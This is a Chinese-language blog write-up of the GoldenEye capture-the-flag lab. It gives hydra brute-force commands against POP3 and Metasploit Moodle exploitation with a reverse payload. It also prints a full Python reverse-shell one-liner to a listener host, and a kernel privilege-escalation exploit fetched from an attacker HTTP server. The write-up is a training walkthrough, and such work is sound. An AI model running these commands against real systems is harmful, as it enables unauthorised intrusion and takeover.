<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="0X01 信息收集首先进行主机探测，发现主机192.168.0.15，且开放25、80端口。  然后我们来访问一下80端口，发现线索：让我们进入到&#x2F;sev-home&#x2F;目录里进行登录。  然后我们访问后要求我们输入账号和密码，接下来就到了寻找密码的时刻了。  我们回到主页，查看页面源代码，发现一处js文件，terminal.js。  访问看一下，留意到其中的注释语句。  丢到百度">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2022/08/18/%E9%A1%B9%E7%9B%AE%E4%B8%80_GoldenEye/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="0X01 信息收集首先进行主机探测，发现主机192.168.0.15，且开放25、80端口。  然后我们来访问一下80端口，发现线索：让我们进入到&#x2F;sev-home&#x2F;目录里进行登录。  然后我们访问后要求我们输入账号和密码，接下来就到了寻找密码的时刻了。  我们回到主页，查看页面源代码，发现一处js文件，terminal.js。  访问看一下，留意到其中的注释语句。  丢到百度">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814234556325.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235002102.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235036577.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235201219.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235257428.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235338026.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815000425074.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815000618740.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815000714844.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815001217210.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815002715285.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815121020691.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815121119156.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815122106311.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815123348881.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815125842757.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815130028674.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815130203153.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815130422855.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815131208122.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815131902158.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815135014952.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816200652070.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816200807823.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816201409496.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816202151947.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203223217.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203322955.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203450906.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203711417.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816204037812.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234036957.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234337088.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234613963.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816233245491.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234800199.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816235100536.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816235838245.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817000131674.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817000520892.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817000754692.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817001637955.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817002137860.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817002343394.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817003237260.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817003412948.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817003849284.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004110103.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004236680.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004329150.png">
<meta property="og:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004536753.png">
<meta property="article:published_time" content="2022-08-17T16:22:16.783Z">
<meta property="article:modified_time" content="2022-08-16T16:48:36.328Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814234556325.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-项目一_GoldenEye" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/08/18/%E9%A1%B9%E7%9B%AE%E4%B8%80_GoldenEye/" class="article-date">
  <time class="dt-published" datetime="2022-08-17T16:22:16.783Z" itemprop="datePublished">2022-08-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0X01-信息收集"><a href="#0X01-信息收集" class="headerlink" title="0X01 信息收集"></a>0X01 信息收集</h1><p>首先进行主机探测，发现主机192.168.0.15，且开放25、80端口。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814234556325.png" alt="image-20220814234556325"></p>
<p>然后我们来访问一下80端口，发现线索：让我们进入到&#x2F;sev-home&#x2F;目录里进行登录。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235002102.png" alt="image-20220814235002102"></p>
<p>然后我们访问后要求我们输入账号和密码，接下来就到了寻找密码的时刻了。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235036577.png" alt="image-20220814235036577"></p>
<p>我们回到主页，查看页面源代码，发现一处js文件，terminal.js。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235201219.png" alt="image-20220814235201219"></p>
<p>访问看一下，留意到其中的注释语句。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235257428.png" alt="image-20220814235257428"></p>
<p>丢到百度翻译里进行翻译看看，看到其中出现了经过编码后的密码密文，以及提到了说Natalya可以破解该密文。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220814235338026.png" alt="image-20220814235338026"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得用户名：Boris、Natalya</span><br><span class="line">获得密码密文：&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span><br></pre></td></tr></table></figure>

<p>然后把密码密文丢到burpsuite里进行decode as html，成功获取明文密码。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815000425074.png" alt="image-20220815000425074"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">此时已经获得的账号和密码：</span><br><span class="line">账号：Boris、Natalya</span><br><span class="line">密码：InvincibleHack3r</span><br></pre></td></tr></table></figure>

<p>然后我们输入账号（boris）密码（InvincibleHack3r）成功登录跳转网站。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815000618740.png" alt="image-20220815000618740"></p>
<p>留意到右边的字，翻译一下，得到提示“我们已将 pop3 服务配置为在非常高的非默认端口上运行”，意味着我们要进行全端口的扫描。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815000714844.png" alt="image-20220815000714844"></p>
<p>扫描后发现多了两个端口，555006和55007，并查看版本信息。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815001217210.png" alt="image-20220815001217210"></p>
<p>接下来尝试利用爆破登录邮件服务。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e &#x27;natalya\nboris&#x27; &gt; user.txt    --将两个用户名写入txt文件</span><br><span class="line">hydra -L user.txt -P /usr/share/wordlists/fasttrack.txt 192.168.0.15 -s 55007 pop3</span><br></pre></td></tr></table></figure>

<p>成功得到邮箱的账号密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账号/密码：</span><br><span class="line">boris/secret1!</span><br><span class="line">natalya/bird</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815002715285.png" alt="image-20220815002715285"></p>
<p>然后通过NC登录pop3查看邮件信封内容枚举：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.15 55007      ---登录邮箱</span><br><span class="line">user boris                 ---登录用户</span><br><span class="line">pass secret1!              ---登录密码</span><br><span class="line">list                       ---查看邮件数量</span><br><span class="line">retr 1~3                   ---查看邮件内容</span><br></pre></td></tr></table></figure>

<p>首先登录的是boris的邮箱账户，里面包含了三封邮件。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815121020691.png" alt="image-20220815121020691"></p>
<p>我们留意到第二封邮件是由natalya发来的，且内容为“Boris，我能破解你的密码”。第三封邮件可以看出有一份文件用了GoldenEye的访问代码作为附件进行发送，并保留在根目录中。但我们无法从此处阅读附件。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815121119156.png" alt="image-20220815121119156"></p>
<p>登录natalya的邮箱查看邮件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.15 55007     ---登录邮箱</span><br><span class="line">user natalya               ---登录用户</span><br><span class="line">pass bird                  ---登录密码</span><br><span class="line">list                       ---查看邮件数量</span><br><span class="line">retr 1~2                   ---查看邮件内容</span><br></pre></td></tr></table></figure>

<p>两封邮件：第一封邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">娜塔莉亚，请你停止破解鲍里斯的密码。 此外，您是 GNO 培训主管。一旦学生被指定给你，我就会给你发电子邮件。此外，请注意可能的网络漏洞。我们获悉，一个名为 Janus 的犯罪集团正在追捕 GoldenEye。</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815122106311.png" alt="image-20220815122106311"></p>
<p>第二封邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">好的 Natalyn 我有一个新学生给你。 由于这是一个新系统，如果您看到任何配置问题，请告诉我或鲍里斯，尤其是它与安全有关的问题……即使不是，也只需以“安全”为幌子下输入它……它将使变更单升级，而不会带来太多麻烦:)</span><br><span class="line">好的，用户信用是：</span><br><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez！</span><br><span class="line">鲍里斯验证了她是一个有效的承包商，所以只需创建帐户，好吗？</span><br><span class="line">如果您没有外部内部域的 URL：severnaya-station.com/gnocertdir</span><br><span class="line">**请务必编辑您的主机文件，因为您通常在远程离线工作....</span><br><span class="line">由于您是 Linux 用户，因此只需将此服务器 IP 指向 /etc/hosts 中的 severnaya-station.com。</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815123348881.png" alt="image-20220815123348881"></p>
<p>在第二封邮件看到了另外一个用户名密码，此服务器域名和网站，还要求我们在本地服务hosts中添加域名信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户名：xenia</span><br><span class="line">密码：RCP90rulez!</span><br><span class="line">域：severnaya-station.com</span><br><span class="line">网址：severnaya-station.com/gnocertdir</span><br></pre></td></tr></table></figure>

<p>在host文件中添加域名，并访问severnaya-station.com&#x2F;gnocertdir。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815125842757.png" alt="image-20220815125842757"></p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815130028674.png" alt="image-20220815130028674"></p>
<p>一访问就可以直接看到是使用了moodle这个cms来建站。随意点击，发现跳转到登录页面。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815130203153.png" alt="image-20220815130203153"></p>
<p>利用刚刚在邮件中获取到的账号密码进行登录就可以成功登录。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815130422855.png" alt="image-20220815130422855"></p>
<p>在点击后台的过程中发现该CMS的版本为2.2.3。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815131208122.png" alt="image-20220815131208122"></p>
<p>在Messages模块当中发现一封邮件，出现新的名字“Dr Doak”，将其写人到user.txt文件中。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815131902158.png" alt="image-20220815131902158"></p>
<p>继续爆破用户名doak的邮箱登录密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.0.15 -s 55007 pop3</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220815135014952.png" alt="image-20220815135014952"></p>
<p>获取用户名&#x2F;密码：diak&#x2F;goat</p>
<p>登录doak用户查看邮件内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.0.15 55007      ---登录邮箱</span><br><span class="line">user doak                  ---登录用户</span><br><span class="line">pass goat                  ---登录密码</span><br><span class="line">list                       ---查看邮件数量</span><br><span class="line">retr 1                     ---查看邮件内容</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816200652070.png" alt="image-20220816200652070"></p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816200807823.png" alt="image-20220816200807823"></p>
<p>此时得到了新的账户信息，用户名：dr_doak，密码：4England!</p>
<p>成功登录之后发现右边多了一个模块，且有一个文件名为s3cret.txt。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816201409496.png" alt="image-20220816201409496"></p>
<p>查看文件里的内容，提示到“这里有一些有趣的东西：&#x2F;dir007key&#x2F;for-007.jpg”</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816202151947.png" alt="image-20220816202151947"></p>
<p>访问看到是一张图片，把他保存到本地先。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://severnaya-station.com/dir007key/for-007.jpg</span><br></pre></td></tr></table></figure>

<p>根据邮件提示让我们检查图片内容，下载图片后，我们可以使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">binwalk（路由逆向分析工具）</span><br><span class="line">exiftool（图虫）</span><br><span class="line">strings（识别动态库版本指令）</span><br><span class="line">等查看jpg文件底层内容！</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203223217.png" alt="image-20220816203223217"></p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203322955.png" alt="image-20220816203322955"></p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203450906.png" alt="image-20220816203450906"></p>
<p>在执行exiftool、strings命令时可以看到base64编码的隐藏信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eFdpbnRlcjE5OTV4IQ==</span><br></pre></td></tr></table></figure>

<p>使用解密工具进行base64解密得到明文：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xWinter1995x!</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816203711417.png" alt="image-20220816203711417"></p>
<p>线索中说，这是管理员用户的密码。管理员用户身份继续登陆应用程序。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码：xWinter1995x!</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816204037812.png" alt="image-20220816204037812"></p>
<h1 id="0X02-GetShell"><a href="#0X02-GetShell" class="headerlink" title="0X02 GetShell"></a>0X02 GetShell</h1><h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>因为该CMS的版本为2.2.3，通过在网上搜索发现可以利用CVE-2013-3630漏洞进行RCE攻击，这里我们直接利用MSF。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search moodle</span><br><span class="line">use 0</span><br><span class="line">set username admin</span><br><span class="line">set password xWinter1995x!</span><br><span class="line">set rhost severnaya-station.com</span><br><span class="line">set targeturi /gnocertdir</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost 192.168.0.109</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use exploit/multi/http/moodle_cmd_exec</span><br><span class="line">msf exploit(moodle_cmd_exec) &gt; set rhost severnaya-station.com</span><br><span class="line">msf exploit(moodle_cmd_exec) &gt; set targeturi /gnocertdir</span><br><span class="line">msf exploit(moodle_cmd_exec) &gt; set username admin</span><br><span class="line">msf exploit(moodle_cmd_exec) &gt; set password xWinter1995x!</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234036957.png" alt="image-20220816234036957"></p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234337088.png" alt="image-20220816234337088"></p>
<p>执行之后发现无法成功。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234613963.png" alt="image-20220816234613963"></p>
<p>查阅资料后知道MSF的底层代码使用的是pspellshell。这里的网页使用的是Googleshell，导致没有办法去运行。</p>
<p>进后台对其进行修改 Home &#x2F;► Site administration &#x2F; ►Plugins &#x2F; ► Text editors &#x2F; ►TinyMCE HTML editor</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816233245491.png" alt="image-20220816233245491"></p>
<p>再次运行，成功！</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816234800199.png" alt="image-20220816234800199"></p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816235100536.png" alt="image-20220816235100536"></p>
<p>然后将shell进行tty</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220816235838245.png" alt="image-20220816235838245"></p>
<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>用修改编辑器中拼写检查配置变量进行反弹shell</p>
<p>Settings&#x2F; ► Site administration &#x2F; ► Server &#x2F; ► System paths &#x2F; ►Path to aspell</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817000131674.png" alt="image-20220817000131674"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.109&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>

<p>同时监听本地6666端口：</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817000520892.png" alt="image-20220817000520892"></p>
<p>然后前往Home &#x2F; ► My profile &#x2F; ► Blogs &#x2F; ► Add a new entry进行触发</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817000754692.png" alt="image-20220817000754692"></p>
<p>成功反弹！</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817001637955.png" alt="image-20220817001637955"></p>
<h1 id="0X03-内核提权"><a href="#0X03-内核提权" class="headerlink" title="0X03 内核提权"></a>0X03 内核提权</h1><p>首先查看一下系统信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817002137860.png" alt="image-20220817002137860"></p>
<p>内核版本Linux ubuntu 3.13.0-32，然后进搜索谷歌搜索：Linux ubuntu 3.13.0-32 exploit。获得exp版本：37292</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817002343394.png" alt="image-20220817002343394"></p>
<p>搜索kali本地的exp库中37292攻击脚本信息，并复制出来。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit 37292</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/37292.c /home/kali/桌面/</span><br></pre></td></tr></table></figure>

<p>由于目标主机环境没有gcc环境，但有cc环境。</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817003237260.png" alt="image-20220817003237260"></p>
<p>需要对脚本进行修改：</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817003412948.png" alt="image-20220817003412948"></p>
<p>这时我们的kali主机开启HTTP服务让目标主机下载该脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817003849284.png" alt="image-20220817003849284"></p>
<p>目标主机访问kali的8081端口并下载脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.109:8081/37292.c</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004110103.png" alt="image-20220817004110103"></p>
<p>编译脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc 37292.c -o 37292</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004236680.png" alt="image-20220817004236680"></p>
<p>直接运行脚本，成功提权！</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004329150.png" alt="image-20220817004329150"></p>
<p>最后成功获取flag：</p>
<p><img src="https://typora-zjs.oss-cn-guangzhou.aliyuncs.com/image-20220817004536753.png" alt="image-20220817004536753"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/18/%E9%A1%B9%E7%9B%AE%E4%B8%80_GoldenEye/" data-id="cl6xto8550001ywue7r2ybl8f" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2022/08/17/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Hello World</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/08/18/%E9%A1%B9%E7%9B%AE%E4%B8%80_GoldenEye/">(no title)</a>
          </li>
        
          <li>
